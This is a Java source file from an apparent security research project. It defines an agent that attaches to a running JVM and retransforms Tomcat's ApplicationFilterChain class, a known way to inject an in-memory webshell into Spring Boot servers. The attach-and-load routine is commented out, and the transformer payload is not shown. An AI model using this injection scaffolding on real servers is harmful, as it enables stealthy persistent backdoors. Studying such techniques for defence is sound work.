package com.madahaRCE.CodeSecAgentmain;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.File;
import java.lang.instrument.Instrumentation;
import java.util.List;


public class SpringbootAgent {
    public static final String CLASSNAME = "org.apache.catalina.core.ApplicationFilterChain";
    public static void agentmain(String args, Instrumentation inst) throws Exception{
        for (Class clazz : inst.getAllLoadedClasses()){
            if (clazz.getName().equals(CLASSNAME)) {
                inst.addTransformer(new SpringbootTransformer(), true);
                inst.retransformClasses(clazz);
            }
        }
    }

//    public static void main(String[] args) throws Exception {
//        List<VirtualMachineDescriptor> list = VirtualMachine.list();
//        for (VirtualMachineDescriptor desc : list) {
//            String name = desc.displayName();
//            String pid = desc.id();
//
//            //if (name.contains("com.madaha.codesecmemshell.CodeSecMemShellApplication")) {
//            if (name.contains(args[0])) {
//                VirtualMachine vm = VirtualMachine.attach(pid);
//                String path = new File("SpringbootAgent.jar").getAbsolutePath();
//                vm.loadAgent(path);
//                vm.detach();
//                System.out.println("attach ok!");
//                break;
//            }
//        }
//    }
}